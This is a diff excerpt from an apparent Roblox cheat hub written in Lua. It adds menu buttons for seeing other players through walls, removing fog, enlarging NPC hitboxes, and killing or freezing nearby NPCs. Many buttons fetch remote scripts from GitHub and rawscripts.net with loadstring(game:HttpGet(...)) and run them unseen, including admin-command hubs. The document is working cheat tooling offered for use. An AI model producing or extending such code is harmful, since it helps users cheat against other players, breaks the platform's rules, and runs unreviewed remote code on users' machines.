+lighting:GetPropertyChangedSignal("FogEnd"):Connect(function()
+	lighting.FogEnd = 1000000
+end)
+
+lighting:GetPropertyChangedSignal("Brightness"):Connect(function()
+	lighting.Brightness = 2
+end)
+
+lighting:GetPropertyChangedSignal("Ambient"):Connect(function()
+	lighting.Ambient = Color3.new(1, 1, 1)
+end)
+
+lighting:GetPropertyChangedSignal("OutdoorAmbient"):Connect(function()
+	lighting.OutdoorAmbient = Color3.new(1, 1, 1)
+end)
    end,
 })
 
@@ -264,6 +1001,67 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/ref
 })
 
 local Button = Tab:CreateButton({
+   Name = "Esp player",
+   Callback = function()
+   local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Function to add ESP to a player
+local function addESP(player)
+	if player == LocalPlayer then return end
+
+	local function onCharacterAdded(character)
+		local highlight = Instance.new("Highlight")
+		highlight.Name = "ESP_Highlight"
+		highlight.FillColor = Color3.fromRGB(0.5, 0, 0.5) -- Blue
+		highlight.OutlineColor = Color3.fromRGB(0.5, 0, 0.5)
+		highlight.OutlineTransparency = 0.5
+		highlight.FillTransparency = 1
+		highlight.Adornee = character
+		highlight.Parent = character
+
+		local head = character:WaitForChild("Head", 5)
+		if head then
+			local billboard = Instance.new("BillboardGui")
+			billboard.Name = "ESP_Name"
+			billboard.Size = UDim2.new(0, 100, 0, 30)
+			billboard.StudsOffset = Vector3.new(0, 2, 0)
+			billboard.AlwaysOnTop = true
+			billboard.Adornee = head
+			billboard.Parent = head
+
+			local nameLabel = Instance.new("TextLabel")
+			nameLabel.Size = UDim2.new(1, 0, 1, 0)
+			nameLabel.BackgroundTransparency = 1
+			nameLabel.Text = player.Name
+			nameLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
+			nameLabel.TextStrokeTransparency = 0.5
+			nameLabel.TextScaled = true
+			nameLabel.Font = Enum.Font.SourceSansBold
+			nameLabel.Parent = billboard
+		end
+	end
+
+	-- Handle character spawn
+	if player.Character then
+		onCharacterAdded(player.Character)
+	end
+	player.CharacterAdded:Connect(onCharacterAdded)
+end
+
+-- Add ESP to all players
+for _, player in pairs(Players:GetPlayers()) do
+	addESP(player)
+end
+
+-- Add ESP to new players
+Players.PlayerAdded:Connect(function(player)
+	addESP(player)
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
    Name = "Fe Grab people",
    Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kietba/Kietba/refs/heads/main/Grab%20people"))()
@@ -271,9 +1069,240 @@ local Button = Tab:CreateButton({
 })
 
 local Button = Tab:CreateButton({
-   Name = "Free camera",
+   Name = "Null fire hub",
    Callback = function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Freecam"))()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Vfly ( Need horse )",
+   Callback = function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Vfly-script-by-me-11871"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Npc lock",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Kietba/Kietba/refs/heads/main/Lock%20script%20kibaz"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Any teleport",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/JonasThePogi/DeadRails/refs/heads/main/newloadstring"))()
+   end,
+})
+
+-- Npc
+
+local Tab = Window:CreateTab("Npc", 4483362458) -- Title, Image
+
+local Section = Tab:CreateSection("Script")
+
+local Button = Tab:CreateButton({
+   Name = "Hitbox Npc Near",
+   Callback = function()
+ local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HitboxGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+-- Create Toggle Button
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Size = UDim2.new(0.2, 0, 0.08, 0)
+toggleButton.Position = UDim2.new(0.4, 0, 0.85, 0)
+toggleButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+toggleButton.Text = "Hitbox OFF"
+toggleButton.Font = Enum.Font.SourceSansBold
+toggleButton.TextSize = 24
+toggleButton.Draggable = true
+toggleButton.Active = true
+toggleButton.Selectable = true
+toggleButton.Parent = screenGui
+
+-- Hitbox Logic
+local isOn = false
+local defaultSize = Vector3.new(2, 2, 1)
+local hitboxSize = Vector3.new(15, 15, 15)
+
+local function updateHitboxes(size)
+	for _, model in ipairs(workspace:GetDescendants()) do
+		if model:IsA("Model") 
+			and model:FindFirstChild("Humanoid") 
+			and model:FindFirstChild("HumanoidRootPart") 
+			and model ~= localPlayer.Character then
+
+			local hrp = model.HumanoidRootPart
+			hrp.Size = size
+			hrp.Transparency = 0.5
+			hrp.CanCollide = false
+		end
+	end
+end
+
+-- Toggle behavior
+toggleButton.MouseButton1Click:Connect(function()
+	isOn = not isOn
+	if isOn then
+		toggleButton.Text = "Hitbox ON"
+		toggleButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+		updateHitboxes(hitboxSize)
+	else
+		toggleButton.Text = "Hitbox OFF"
+		toggleButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+		updateHitboxes(defaultSize)
+	end
+end)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Kill Npc Mear",
+   Callback = function()
+   -- Lấy người chơi và mouse
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+
+-- Tạo GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false
+
+-- Tạo Frame chính của GUI (kích thước nhỏ hơn)
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 75, 0, 75)  -- Kích thước nhỏ hơn
+mainFrame.Position = UDim2.new(0, 50, 0, 50)  -- Đặt vào giữa màn hình
+mainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+mainFrame.Active = true
+mainFrame.Draggable = true  -- Cho phép kéo thả
+
+-- Tạo nút "Kill Nearby NPCs"
+local killBtn = Instance.new("TextButton", mainFrame)
+killBtn.Size = UDim2.new(1, 0, 1, 0)
+killBtn.Text = "Kill NPCs"
+killBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+killBtn.TextColor3 = Color3.new(1, 1, 1)
+killBtn.Font = Enum.Font.SourceSansBold
+killBtn.TextSize = 14  -- Kích thước chữ nhỏ hơn
+killBtn.TextWrapped = true  -- Cho phép chữ xuống dòng nếu cần
+
+-- Hàm giết NPC gần người chơi
+local function killNearbyNPCs()
+    local character = player.Character
+    if not character then return end
+
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    -- Duyệt qua tất cả các đối tượng trong workspace
+    for _, npc in pairs(workspace:GetDescendants()) do
+        -- Kiểm tra xem đối tượng có phải là NPC (Model có Humanoid)
+        if npc:IsA("Model") and npc ~= character and npc:FindFirstChild("Humanoid") and npc:FindFirstChild("HumanoidRootPart") then
+            local dist = (npc.HumanoidRootPart.Position - root.Position).Magnitude
+            -- Kiểm tra khoảng cách giữa NPC và người chơi
+            if dist <= 50 then -- bán kính 50 studs (có thể thay đổi)
+                -- Giảm máu NPC xuống 0 (chết)
+                npc.Humanoid.Health = 0
+            end
+        end
+    end
+end
+
+-- Khi nhấn nút "Kill Nearby NPCs"
+killBtn.MouseButton1Click:Connect(killNearbyNPCs)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Freeze Npc Near",
+   Callback = function()
+   local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "FreezeNPCGui"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Nút GUI
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 160, 0, 50)
+button.Position = UDim2.new(0.5, -80, 0.9, 0)
+button.Text = "Freeze : Off"
+button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.SourceSansBold
+button.TextScaled = true
+button.Active = true
+button.Draggable = true -- Cho phép kéo nút
+button.Parent = gui
+
+local freezeEnabled = false
+local radius = 100
+
+-- Đóng băng NPC gần
+local function toggleFreeze()
+	freezeEnabled = not freezeEnabled
+
+	if freezeEnabled then
+		button.Text = "Freeze : On"
+		button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+	else
+		button.Text = "Freeze : Off"
+		button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+	end
+
+	local rootPart = character:FindFirstChild("HumanoidRootPart")
+	if not rootPart then return end
+
+	for _, npc in pairs(workspace:GetDescendants()) do
+		if npc:IsA("Model") and npc ~= character and npc:FindFirstChild("Humanoid") and npc:FindFirstChild("HumanoidRootPart") then
+			local distance = (npc.HumanoidRootPart.Position - rootPart.Position).Magnitude
+			if distance <= radius then
+				npc.HumanoidRootPart.Anchored = freezeEnabled
+				if freezeEnabled then
+					npc.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+				else
+					npc.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+				end
+			end
+		end
+	end
+end
+
+-- Bắt sự kiện click
+button.MouseButton1Click:Connect(toggleFreeze)
+   end,
+})
+-- Admin
+
+
+local Tab = Window:CreateTab("Admin", 4483362458) -- Title, Image
+
+local Section = Tab:CreateSection("Admin")
+
+local Button = Tab:CreateButton({
+   Name = "Infinite yield",
+   Callback = function()
+   -- https://scriptblox.com/script/Infinite-Yield_500
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Nameless",
+   Callback = function()
+   -- https://scriptblox.com/script/Universal-Script-Nameless-Admin-cool-admin-commands-36157
+
+loadstring(game:HttpGet("https://github.com/FilteringEnabled/NamelessAdmin/blob/main/Source?raw=true"))()
    end,
 })
 
